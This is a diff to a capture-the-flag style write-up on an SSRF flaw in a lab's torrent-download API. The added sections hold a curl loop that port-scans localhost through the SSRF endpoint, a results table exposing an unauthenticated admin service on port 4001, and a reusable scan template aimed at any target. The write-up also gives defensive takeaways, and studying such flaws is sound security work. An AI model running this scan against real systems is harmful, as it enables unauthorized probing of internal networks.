@@ -198,9 +198,34 @@ The validation checks that the host is `localhost` but does NOT restrict the por
 
 ## 4. Port Enumeration - The Key Step
 
-Once SSRF was confirmed, the next question: what's actually validated? Testing showed `localhost:3000` returns 400 ("Invalid service URL") but `localhost:4000` works fine. The validation checks hostname = `localhost` but does NOT restrict the port. So the bypass is trivial -- just try adjacent ports.
+Once SSRF was confirmed, the next question: what's actually validated? A batch port scan via the SSRF vector reveals the answer immediately. Fuzz `localhost:<PORT>/` across common ports:
 
-No fragment bypass, no URL encoding tricks. Port 4001 (one away from the known internal service on 4000) was the first probe:
+```bash
+# Port scan via SSRF - one curl per port, filter by HTTP status
+for port in 3000 3001 4000 4001 4002 5000 5432 6379 8080 9000 9090 27017; do
+  status=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
+    https://<LAB>/api/limewire/download \
+    -H "Authorization: Bearer <TOKEN>" \
+    -H "Content-Type: application/json" \
+    -d "{\"torrent_url\":\"http://localhost:$port/\"}")
+  echo "Port $port: $status"
+done
+```
+
+Results:
+
+| Port | Status | Response Body | Interpretation |
+|------|--------|---------------|----------------|
+| 3000 | 400 | "Invalid service URL" | Blocked by validator |
+| 3001 | 400 | "Invalid service URL" | Blocked by validator |
+| **4000** | **200** | `{"status":"online","endpoints":["/torrent","/redpillconsole","/rabbithole"]}` | Known torrent service |
+| **4001** | **200** | `{"status":"online","clearence-level":"admin"}` | Admin service -- no auth |
+| 4002 | 400 | "Invalid service URL" | Blocked by validator |
+| 5000-27017 | 400 | "Invalid service URL" | All blocked |
+
+The validator allows a port range (4000-4001) rather than any arbitrary port. But the developer forgot that port 4001 hosts a separate admin service with no authentication. No fragment bypass, no URL encoding tricks -- just the next port over.
+
+The winning request:
 
 ```http
 POST /api/limewire/download HTTP/1.1
@@ -330,3 +355,46 @@ After confirming SSRF with URL validation:
 1. Test what's actually validated (host? port? scheme? path?)
 2. Test adjacent ports (port +/- 1, common service ports)
 3. Don't spend more than 5 minutes on one port before checking others
+
+---
+
+## 8. Security Takeaways
+
+1. **Port scan immediately after SSRF confirmation.** The moment you confirm a server-side fetch, batch-fuzz the port number before deep-diving any single service. A 12-port scan takes 2 seconds and eliminates hours of rabbit holes.
+
+2. **Allowlist != single value.** The validator here allowed a port range (4000-4001), not just the intended service port. Developers often allowlist broader than necessary -- regex `localhost:4\d{3}` instead of exact `localhost:4000`. Always probe the boundaries of what the filter actually permits.
+
+3. **Adjacent ports host adjacent services.** Microservice architectures commonly bind related services on sequential ports (app:3000, admin:3001, metrics:9090). When you find one internal service, the next port over is the highest-priority guess.
+
+4. **No fragment bypass needed.** The Discord discussion asked about `#` fragment bypass -- that's unnecessary here. The filter checks hostname only, leaving the port field wide open. Don't over-engineer the bypass before understanding what's actually validated.
+
+5. **Internal admin services skip auth.** Port 4001's admin service required zero authentication because it was "only reachable internally." SSRF turns that assumption into a vulnerability. Any internal service reachable via SSRF should be treated as externally exposed.
+
+### Vulnerability Classes
+
+| # | Vulnerability | Impact |
+|---|--------------|--------|
+| 1 | SSRF (server-side fetch via `torrent_url`) | Access to internal services |
+| 2 | Overly permissive URL allowlist (port range vs exact port) | Pivot to unintended services |
+| 3 | Unauthenticated internal admin service | Full admin access via SSRF chain |
+
+### SSRF Port Scanning Methodology
+
+```bash
+# Quick port scan template via SSRF
+# Adapt the endpoint/field to match the target's fetch mechanism
+for port in 3000 3001 4000 4001 4002 5000 5432 6379 8000 8080 9000 9090 27017; do
+  status=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
+    https://<TARGET>/api/<ssrf-endpoint> \
+    -H "Authorization: Bearer <TOKEN>" \
+    -H "Content-Type: application/json" \
+    -d "{\"url_field\":\"http://localhost:$port/\"}")
+  echo "Port $port: HTTP $status"
+done
+
+# Differentiation:
+# 200 = internal service responded (OPEN)
+# 400 = blocked by URL validator (FILTERED)
+# 500 = connection refused / timeout (CLOSED)
+# Response body length differences = different services on different ports
+```
